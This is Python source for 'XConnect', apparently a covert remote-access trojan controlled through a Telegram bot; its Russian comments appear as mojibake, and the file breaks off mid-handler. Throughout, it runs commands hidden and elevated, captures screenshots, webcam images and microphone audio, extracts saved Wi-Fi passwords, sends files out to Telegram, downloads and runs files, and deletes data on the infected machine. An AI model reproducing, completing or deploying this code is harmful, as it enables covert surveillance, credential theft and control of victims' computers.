# XConnect BETA VERSION By Horgvards
# 1.0

import subprocess
import sys
import os
from hwid_manager import get_hwid, check_hwid

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏
if len(sys.argv) < 2 or sys.argv[1] != "–í–í–ï–î–ò–¢–ï HWID - ENTER HWID":
    print("–û—à–∏–±–∫–∞: –°–∫—Ä–∏–ø—Ç –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–ø—É—â–µ–Ω —Ç–æ–ª—å–∫–æ —á–µ—Ä–µ–∑ BAT-—Ñ–∞–π–ª.")
    exit(1)

# –£–∑–Ω–∞–µ–º —Ç–µ–∫—É—â–∏–π HWID (–¥–ª—è –æ—Ç–ª–∞–¥–∫–∏)
current_hwid = get_hwid()
print("–¢–µ–∫—É—â–∏–π HWID:", current_hwid)

# –ó–∞–¥–∞–µ–º —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã–π HWID
ALLOWED_HWID = current_hwid  # –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ç–µ–∫—É—â–∏–π HWID –∫–∞–∫ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã–π

# –ü—Ä–æ–≤–µ—Ä–∫–∞ HWID
if not check_hwid(ALLOWED_HWID):
    print("–û—à–∏–±–∫–∞: –ù–µ–≤–µ—Ä–Ω—ã–π HWID. –°–∫—Ä–∏–ø—Ç –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–ø—É—â–µ–Ω.")
    exit(1)

# –ï—Å–ª–∏ –≤—Å–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–æ–π–¥–µ–Ω—ã, –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –æ—Å–Ω–æ–≤–Ω–æ–π –∫–æ–¥
print("–ü—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–æ–π–¥–µ–Ω—ã. –ó–∞–ø—É—Å–∫ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞...")

# –°–ø–∏—Å–æ–∫ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫
required_libraries = [
    "requests",
    "datetime",
    "customtkinter",
    "pyautogui",
    "psutil",
    "platform",
    "plyer",
    "cryptography",
    "pygame",  # –î–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∞—É–¥–∏–æ
    "opencv-python",  # –î–ª—è —Ä–∞–±–æ—Ç—ã —Å –≤–µ–±-–∫–∞–º–µ—Ä–æ–π
    "numpy",
    "sounddevice",  # –î–ª—è –∑–∞–ø–∏—Å–∏ –∞—É–¥–∏–æ
    "soundfile",    # –î–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –∞—É–¥–∏–æ
    "webbrowser"    # –î–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è URL
]

def install_libraries():
    for lib in required_libraries:
        try:
            __import__(lib)  # –ü—Ä–æ–±—É–µ–º –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –±–∏–±–ª–∏–æ—Ç–µ–∫—É
            print(f"–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ {lib} —É–∂–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞.")
        except ImportError:
            print(f"–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏: {lib}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

# –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –±–∏–±–ª–∏–æ—Ç–µ–∫–∏, –µ—Å–ª–∏ –æ–Ω–∏ –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç
install_libraries()

# –ò–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –ø–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏
import threading
import socket
import time
import pyautogui
import psutil
import requests
import platform
from datetime import datetime
import tkinter as tk
import customtkinter as ctk
import cv2
import numpy as np
from plyer import notification
import pygame
import sounddevice as sd
import soundfile as sf
import webbrowser

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram –±–æ—Ç–∞
TELEGRAM_BOT_TOKEN = "TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "CHAT_ID"

class TelegramBot:
    @staticmethod
    def send_message(message):
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
        try:
            response = requests.post(url, json=payload)
            response.raise_for_status()
        except requests.RequestException as e:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram: {e}")

    @staticmethod
    def send_photo(photo_path):
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as photo:
            payload = {"chat_id": TELEGRAM_CHAT_ID}
            files = {"photo": photo}
            try:
                response = requests.post(url, data=payload, files=files)
                response.raise_for_status()
            except requests.RequestException as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–æ—Ç–æ –≤ Telegram: {e}")

    @staticmethod
    def send_file(file_path):
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as file:
            payload = {"chat_id": TELEGRAM_CHAT_ID}
            files = {"document": file}
            try:
                response = requests.post(url, data=payload, files=files)
                response.raise_for_status()
            except requests.RequestException as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞ –≤ Telegram: {e}")

class SystemCommands:
    @staticmethod
    def execute_command_as_admin(command):
        if not command:
            return "–û—à–∏–±–∫–∞: –ü—É—Å—Ç–∞—è –∫–æ–º–∞–Ω–¥–∞."
        try:
            result = subprocess.run(
    ["powershell", "-Command", f"Start-Process cmd -ArgumentList '/c {command}' -Verb runAs -WindowStyle Hidden"],
    capture_output=True, text=True, encoding='cp1251', shell=True, creationflags=subprocess.CREATE_NO_WINDOW
    )
            return result.stdout.strip() or "–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ." if result.returncode == 0 else result.stderr.strip() or "–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã: {e}"
            
    @staticmethod
    def disconnect_wifi():
        try:
            # –ü–æ–ª—É—á–∞–µ–º –∏–º—è Wi-Fi –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞
            result = subprocess.run(
                ["netsh", "wlan", "show", "interfaces"],
                capture_output=True, text=True, encoding='utf-8'
            )
            if result.returncode != 0 or not result.stdout:
                return "–û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ Wi-Fi."

            if "SSID" in result.stdout:
                ssid = result.stdout.split("SSID")[1].split(":")[1].split("\n")[0].strip()
                # –û—Ç–∫–ª—é—á–∞–µ–º—Å—è –æ—Ç Wi-Fi
                subprocess.run(
                    ["netsh", "wlan", "disconnect"],
                    capture_output=True, text=True, encoding='utf-8'
                )
                return f"–û—Ç–∫–ª—é—á–µ–Ω–æ –æ—Ç Wi-Fi: {ssid}"
            else:
                return "Wi-Fi –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞: {e}"

    @staticmethod
    def take_screenshot():
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        return screenshot_path

    @staticmethod
    def get_system_info():
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()
        disk_usage = psutil.disk_usage('/')
        return (
            f"üíª –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ:\n"
            f"üîß –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: {cpu_usage}%\n"
            f"üß† –ü–∞–º—è—Ç—å: {memory_info.percent}%\n"
            f"üíæ –î–∏—Å–∫: {disk_usage.percent}%"
        )

    @staticmethod
    def list_files(directory):
        try:
            if not os.path.exists(directory):
                return f"–û—à–∏–±–∫–∞: –î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è '{directory}' –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç."
            files = os.listdir(directory)
            return "\n".join(files) if files else f"–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è '{directory}' –ø—É—Å—Ç–∞."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ —Ñ–∞–π–ª–æ–≤: {e}"

    @staticmethod
    def download_file(file_path):
        try:
            if not os.path.exists(file_path):
                return f"–û—à–∏–±–∫–∞: –§–∞–π–ª '{file_path}' –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç."
            TelegramBot.send_file(file_path)
            return f"–§–∞–π–ª '{file_path}' —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞: {e}"

    @staticmethod
    def upload_file(file_id, save_path):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
            params = {"file_id": file_id}
            response = requests.get(url, params=params).json()

            if "result" not in response:
                return "–û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ñ–∞–π–ª–µ."

            file_path = response["result"]["file_path"]
            file_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"

            response = requests.get(file_url)
            with open(save_path, 'wb') as file:
                file.write(response.content)

            return f"–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω –∏ —Å–æ—Ö—Ä–∞–Ω—ë–Ω –∫–∞–∫ '{save_path}'."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–∞: {e}"

    @staticmethod
    def execute_file(file_path):
        try:
            if not os.path.exists(file_path):
                return f"–û—à–∏–±–∫–∞: –§–∞–π–ª '{file_path}' –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç."
            os.startfile(file_path)
            return f"–§–∞–π–ª '{file_path}' —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞: {e}"

    @staticmethod
    def kill_process(process_name):
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == process_name:
                    proc.terminate()
                    return f"–ü—Ä–æ—Ü–µ—Å—Å '{process_name}' –∑–∞–≤–µ—Ä—à—ë–Ω."
            return f"–ü—Ä–æ—Ü–µ—Å—Å '{process_name}' –Ω–µ –Ω–∞–π–¥–µ–Ω."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞: {e}"

    @staticmethod
    def get_external_ip():
        try:
            response = requests.get("https://api.ipify.org?format=json")
            ip = response.json()["ip"]
            return f"–í–Ω–µ—à–Ω–∏–π IP: {ip}"
        except Exception as e:
            return f"–û—à–∏–±–∫–∞: {e}"

    @staticmethod
    def get_wifi_info():
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "interfaces"],
                capture_output=True, text=True, encoding='utf-8'
            )
            if result.returncode != 0 or not result.stdout:
                return "–û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ Wi-Fi."

            if "SSID" in result.stdout:
                ssid = result.stdout.split("SSID")[1].split(":")[1].split("\n")[0].strip()
                result = subprocess.run(
                    ["netsh", "wlan", "show", "profile", ssid, "key=clear"],
                    capture_output=True, text=True, encoding='utf-8'
                )
                if result.returncode != 0 or not result.stdout:
                    return f"Wi-Fi: {ssid}\n–ü–∞—Ä–æ–ª—å: –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å."

                if "Key Content" in result.stdout:
                    password = result.stdout.split("Key Content")[1].split(":")[1].split("\n")[0].strip()
                    return f"Wi-Fi: {ssid}\n–ü–∞—Ä–æ–ª—å: {password}"
                else:
                    return f"Wi-Fi: {ssid}\n–ü–∞—Ä–æ–ª—å: –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å (–ø–∞—Ä–æ–ª—å –Ω–µ —Å–æ—Ö—Ä–∞–Ω—ë–Ω –∏–ª–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω)."
            else:
                return "Wi-Fi –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞: {e}"

    @staticmethod
    def shutdown_computer():
        try:
            os.system("shutdown /s /t 1")
            return "–ö–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–∞–µ—Ç—Å—è..."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞: {e}"

    @staticmethod
    def restart_computer():
        try:
            os.system("shutdown /r /t 1")
            return "–ö–æ–º–ø—å—é—Ç–µ—Ä –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è..."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞: {e}"

    @staticmethod
    def sleep_computer():
        try:
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
            return "–ö–æ–º–ø—å—é—Ç–µ—Ä –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç –≤ —Å–ø—è—â–∏–π —Ä–µ–∂–∏–º..."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞: {e}"

    @staticmethod
    def create_folder(path):
        try:
            if not path:
                return "–û—à–∏–±–∫–∞: –ü—É—Ç—å –Ω–µ —É–∫–∞–∑–∞–Ω."
            os.makedirs(path, exist_ok=True)
            return f"–ü–∞–ø–∫–∞ '{path}' —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –ø–∞–ø–∫–∏: {e}"

    @staticmethod
    def delete_path(path):
        try:
            if os.path.isfile(path):
                os.remove(path)
                return f"–§–∞–π–ª '{path}' —É–¥–∞–ª—ë–Ω."
            elif os.path.isdir(path):
                os.rmdir(path)
                return f"–ü–∞–ø–∫–∞ '{path}' —É–¥–∞–ª–µ–Ω–∞."
            else:
                return f"–û—à–∏–±–∫–∞: '{path}' –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞: {e}"

    @staticmethod
    def capture_webcam():
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("webcam.jpg", frame)
                cap.release()
                return "webcam.jpg"
            else:
                return "–û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞: {e}"

    @staticmethod
    def play_audio(file_path):
        try:
            pygame.mixer.init()
            pygame.mixer.music.load(file_path)
            pygame.mixer.music.play()
            return f"–ê—É–¥–∏–æ '{file_path}' –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—Å—è."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞: {e}"

    @staticmethod
    def stop_audio():
        try:
            pygame.mixer.music.stop()
            return "–í–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ –∞—É–¥–∏–æ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞: {e}"

    @staticmethod
    def record_audio(duration):
        try:
            sample_rate = 44100
            channels = 2
            print(f"–ó–∞–ø–∏—Å—å –∞—É–¥–∏–æ –≤ —Ç–µ—á–µ–Ω–∏–µ {duration} —Å–µ–∫—É–Ω–¥...")
            audio_data = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=channels)
            sd.wait()
            file_path = "recorded_audio.wav"
            sf.write(file_path, audio_data, sample_rate)
            return file_path
        except ImportError:
            return "–£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ sounddevice –∏ soundfile: pip install sounddevice soundfile"
        except Exception as e:
            return f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø–∏—Å–∏ –∞—É–¥–∏–æ: {e}"

    @staticmethod
    def open_url(url):
        try:
            webbrowser.open(url)
            return f"URL '{url}' —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã—Ç –≤ –±—Ä–∞—É–∑–µ—Ä–µ."
        except Exception as e:
            return f"–û—à–∏–±–∫–∞: {e}"

    @staticmethod
    def send_notification(message):
        try:
            notification.notify(
                title="XConnect",
                message=message,
                timeout=10
            )
            return f"–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: {message}"
        except Exception as e:
            return f"–û—à–∏–±–∫–∞: {e}"

def handle_telegram_commands():
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 10}
            response = requests.get(url, params=params).json()

            if "result" in response:
                for update in response["result"]:
                    last_update_id = update["update_id"]
                    message = update.get("message", {}).get("text", "").strip()

                    if message.startswith("/cmd"):
                        command = message[len("/cmd"):].strip()
                        if not command:
                            TelegramBot.send_message("–û—à–∏–±–∫–∞: –ö–æ–º–∞–Ω–¥–∞ –Ω–µ —É–∫–∞–∑–∞–Ω–∞.")
                            continue

                        if command.lower() in ["exit", "quit"]:
                            TelegramBot.send_message("–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —É–¥–∞–ª—ë–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞...")
                            os._exit(0)

                        output = SystemCommands.execute_command_as_admin(command)
                        TelegramBot.send_message(f"–†–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã:\n{output}")

                    elif message.startswith("/help"):
                        help_message = (
                            "–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n"
                            "/cmd <–∫–æ–º–∞–Ω–¥–∞> - –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –Ω–∞ —É–¥–∞–ª—ë–Ω–Ω–æ–º –∫–æ–º–ø—å—é—Ç–µ—Ä–µ.\n"
                            "/screenshot - —Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞.\n"
                            "/sysinfo - –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ.\n"
                            "/files <–¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è> - –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏.\n"
                            "/download <–ø—É—Ç—å_–∫_—Ñ–∞–π–ª—É> - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª —Å –∫–æ–º–ø—å—é—Ç–µ—Ä–∞.\n"
                            "/upload - –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä (–æ—Ç–≤–µ—Ç—å—Ç–µ –Ω–∞ —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–º).\n"
                            "/exec <–ø—É—Ç—å_–∫_—Ñ–∞–π–ª—É> - –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Ñ–∞–π–ª –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ.\n"
                            "/kill <–∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞> - –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å.\n"
                            "/ip - –ø–æ–∫–∞–∑–∞—Ç—å –≤–Ω–µ—à–Ω–∏–π IP.\n"
                            "/wifi - –ø–æ–∫–∞–∑–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ Wi-Fi.\n"
                            "/disconnectwifi - –æ—Ç–∫–ª—é—á–∏—Ç—å Wi-Fi –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ.\n"
                            "/shutdown - –≤—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä.\n"
                            "/restart - –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä.\n"
                            "/sleep - –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –∫–æ–º–ø—å—é—Ç–µ—Ä –≤ —Å–ø—è—â–∏–π —Ä–µ–∂–∏–º.\n"
                            "/create_folder <–ø—É—Ç—å> - —Å–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É.\n"
                            "/delete <–ø—É—Ç—å> - —É–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª –∏–ª–∏ –ø–∞–ø–∫—É.\n"
                            "/webcam - —Å–¥–µ–ª–∞—Ç—å —Å–Ω–∏–º–æ–∫ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã.\n"
                            "/play <–ø—É—Ç—å> - –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ –∞—É–¥–∏–æ.\n"
                            "/stopaudio - –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ –∞—É–¥–∏–æ.\n"
                            "/notify <—Ç–µ–∫—Å—Ç> - –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –Ω–∞ —ç–∫—Ä–∞–Ω.\n"
                            "/recordaudio <–¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å> - –∑–∞–ø–∏—Å–∞—Ç—å –∞—É–¥–∏–æ.\n"
                            "/openurl <URL> - –æ—Ç–∫—Ä—ã—Ç—å URL –≤ –±—Ä–∞—É–∑–µ—Ä–µ.\n"
                            "/help - –ø–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ."
                        )
                        TelegramBot.send_message(help_message)

                    elif message.startswith("/screenshot"):
                        screenshot_path = SystemCommands.take_screenshot()
                        TelegramBot.send_photo(screenshot_path)
                        os.remove(screenshot_path)

                    elif message.startswith("/sysinfo"):
                        system_info = SystemCommands.get_system_info()
                        TelegramBot.send_message(system_info)

                    elif message.startswith("/files"):
                        directory = message[len("/files"):].strip()
                        if not directory:
                            TelegramBot.send_message("–û—à–∏–±–∫–∞: –î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ —É–∫–∞–∑–∞–Ω–∞.")
                            continue

                        files_list = SystemCommands.list_files(directory)
                        TelegramBot.send_message(f"–§–∞–π–ª—ã –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ '{directory}':\n{files_list}")

                    elif message.startswith("/download"):
                        file_path = message[len("/download"):].strip()
                        if not file_path:
                            TelegramBot.send_message("–û—à–∏–±–∫–∞: –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É –Ω–µ —É–∫–∞–∑–∞–Ω.")
                            continue

                        result = SystemCommands.download_file(file_path)
                        TelegramBot.send_message(result)

                    elif message.startswith("/upload"):
                        TelegramBot.send_message("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª –≤ –æ—Ç–≤–µ—Ç –Ω–∞ —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ.")

                    elif message.startswith("/exec"):
                        file_path = message[len("/exec"):].strip()
                        if not file_path:
                            TelegramBot.send_message("–û—à–∏–±–∫–∞: –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É –Ω–µ —É–∫–∞–∑–∞–Ω.")
                            continue

                        result = SystemCommands.execute_file(file_path)
                        TelegramBot.send_message(result)

                    elif message.startswith("/kill"):
                        process_name = message[len("/kill"):].strip()
                        if not process_name:
                            TelegramBot.send_message("–û—à–∏–±–∫–∞: –ò–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–µ —É–∫–∞–∑–∞–Ω–æ.")
                            continue

                        result = SystemCommands.kill_process(process_name)
                        TelegramBot.send_message(result)

                    elif message.startswith("/ip"):
                        result = SystemCommands.get_external_ip()
                        TelegramBot.send_message(result)

                    elif message.startswith("/wifi"):
                        result = SystemCommands.get_wifi_info()
                        TelegramBot.send_message(result)

                    elif message.startswith("/shutdown"):
                        result = SystemCommands.shutdown_computer()
                        TelegramBot.send_message(result)

                    elif message.startswith("/restart"):
                        result = SystemCommands.restart_computer()
                        TelegramBot.send_message(result)

                    elif message.startswith("/sleep"):
                        result = SystemCommands.sleep_computer()
                        TelegramBot.send_message(result)

                    elif message.startswith("/create_folder"):
                        path = message[len("/create_folder"):].strip()
                        if not path:
                            TelegramBot.send_message("–û—à–∏–±–∫–∞: –ü—É—Ç—å –Ω–µ —É–∫–∞–∑–∞–Ω.")
                            continue

                        result = SystemCommands.create_folder(path)
                        TelegramBot.send_message(result)

                    elif message.startswith("/delete"):
                        path = message[len("/delete"):].strip()
                        if not path:
                            TelegramBot.send_message("–û—à–∏–±–∫–∞: –ü—É—Ç—å –Ω–µ —É–∫–∞–∑–∞–Ω.")
                            continue

                        result = SystemCommands.delete_path(path)
                        TelegramBot.send_message(result)

                    elif message.startswith("/webcam"):
                        result = SystemCommands.capture_webcam()
                        if result.endswith(".jpg"):
                            TelegramBot.send_photo(result)
                            os.remove(result)
                        else:
                            TelegramBot.send_message(result)

                    elif message.startswith("/play"):
                        file_path = message[len("/play"):].strip()
                        if not file_path:
                            TelegramBot.send_message("–û—à–∏–±–∫–∞: –ü—É—Ç—å –∫ –∞—É–¥–∏–æ—Ñ–∞–π–ª—É –Ω–µ —É–∫–∞–∑–∞–Ω.")
                            continue

                        result = SystemCommands.play_audio(file_path)
                        TelegramBot.send_message(result)

                    elif message.startswith("/stopaudio"):
                        result = SystemCommands.stop_audio()
                        TelegramBot.send_message(result)

                    elif message.startswith("/notify"):
                        text = message[len("/notify"):].strip()
                        if not text:
                            TelegramBot.send_message("–û—à–∏–±–∫–∞: –¢–µ–∫—Å—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –Ω–µ —É–∫–∞–∑–∞–Ω.")
                            continue

                        result = SystemCommands.send_notification(text)
                        TelegramBot.send_message(result)
                        
                    elif message.startswith("/disconnectwifi"):
                        result = SystemCommands.disconnect_wifi()
                        TelegramBot.send_message(result)

                    elif message.startswith("/recordaudio"):
                        try:
                            duration = int(message[len("/recordaudio"):].strip())
                            if duration <= 0:
                                TelegramBot.send_message("–û—à–∏–±–∫–∞: –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –±–æ–ª—å—à–µ 0 —Å–µ–∫—É–Ω–¥.")
                                continue

                            result = SystemCommands.record_audio(duration)
                            if result.endswith(".wav"):
                                TelegramBot.send_file(result)
                                os.remove(result)
                            else:
                                TelegramBot.send_message(result)
                        except ValueError:
